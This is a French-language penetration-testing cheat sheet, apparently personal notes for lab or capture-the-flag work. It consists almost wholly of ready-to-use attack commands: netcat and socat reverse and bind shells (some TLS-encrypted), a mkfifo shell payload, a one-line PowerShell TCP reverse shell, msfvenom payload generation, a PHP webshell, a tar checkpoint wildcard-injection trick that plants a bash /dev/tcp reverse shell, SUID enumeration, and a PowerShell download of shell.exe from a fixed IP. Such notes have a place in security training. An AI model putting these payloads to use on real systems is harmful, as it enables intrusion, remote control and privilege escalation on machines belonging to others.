## 1) Netcat

#### *Pour un reverse shell*

Pour l'attaquant :

```bash
nc -lvnp <port-number>
```

#### *Pour un bind shell*

Pour l'attaquant :

```bash
nc <IP> <port-number>
```

#### *Pour stabiliser le shell*

Avec python :

Permet d'avoir un shell plus joli.

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
export TERM=xterm
```

Pour donner l'accès aux commandes comme clear, ...

Apres avoir mis le shell en background :

```bash
stty raw -echo; fg
```

Permet d'avoir accès à l'autocomplétion, aux flèches et au Ctrl-C et ensuite met le shell au premier plan.

Pour rénitialiser, il suffit de taper la commande "reset".

## 2) Rlwrap

Même technique que pour netcat en utilisant rlwrap devant la commande nc. Il est utilisé notamment pour les machines windows.

## 3) Socat

Pour écouter :

```bash
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

Pour se connecter :

```bash
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

- pty : Alloue un pseudo terminal sur la cible
- stderr : Toutes les erreurs sont affichés sur le shell
- sigint : Active les Ctrl-C
- setsid : crée le processus dans une nouvelle session
- sane : Essaye de stabiliser le shell

#### *Ecrypted shell with Socat*

Tout d'abord, il faudra crée un certificat auto-signé avec OpenSSL.

```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```

Ensuite on va regrouper le fichier .key et le fichier .crt en un seul fichier .pem

```bash
cat shell.key shell.crt > shell.pem
```

Pour écouter :

```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```

Pour se connecter :

```bash
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

Combinaison des deux techniques :

```bash
socat OPENSSL-LISTEN:<PORT>,cert=<FILE.pem>,verify=0 FILE:`tty`,raw,echo=0
```

et pour se connecter : 

```bash
socat openssl:<IP>:<PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

## 4) Common Payload

Pour écouter (bind shell) :

```bash
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

Pour se connecter (reverse shell) :

```bash
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

## 5) Pour les Windows Server

Il faut écouter avec une des techniques de reverse shell précédentes et :

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

En modifiant l'IP et le port.

## 6) Msfvenom

Pour générer un reverse shell Windows :

```bash
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```

- -f : Choisi le format
- -o : Choisi le nom du fichier output

Les shells sont divisés en 2 catégories, les staged et les stageless :

- Staged : Le payload est envoyé en 2 parties. La première est appelée le stager. C'est la partie qui est exécutée directement par le serveur pour se connecter à un listener. Mais il ne contient pas de reverse shell dans son code. Il utilisera la connection pour charger le vrai payload et l'exécuter.
- Stageless : Le payload est envoyé entièrement avec le reverse_shell

## 7) Webshell

Un exemple de commande pour avoir un webshell :

```bash
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

## 8) Shell avec tar

Si une tâche est effectué dans qui nécessite l'utilisation de tar, alors on peut faire ce shell.

Tout d'abord :

```bash
printf '#!/bin/bash\nbash -i >& /dev/tcp/<attack ip>/<port> 0>&1' > /var/www/html/shell
```

Pour permettre l'exécution du script :

```bash
chmod +x /var/www/html/shell
```

```bash
touch /var/www/html/--checkpoint=1
ou avec echo "" >
```

```bash
touch /var/www/html/--checkpoint-action=exec=bash\ shell
ou avec echo "" >
```

Lancer un listener sur votre machine avec le port spécifier :

```bash
nc -lvnp <port>
```

## 9) Trouver les permissions

```bash
getcap -r / 2>/dev/null
```

```bash
find / \( -perm -4000 -o -perm -2000 \) -type f -exec ls -la {} \; 2>/dev/null
find / -type f -perm -u=s 2>/dev/null
```

```bash
sudo -l
```

## 10) Download un shell Windows

```powershell
powershell -c "(New-Object System.Net.WebClient).Downloadfile('http://10.11.53.14:4444/shell.exe','shell.exe')"
```

## 11) ltrace

Ne pas oublier cette commande pour afficher les appels des applications.

## 12) Groupe

Ne pas oublier de regarder les groupes avec la commande id.
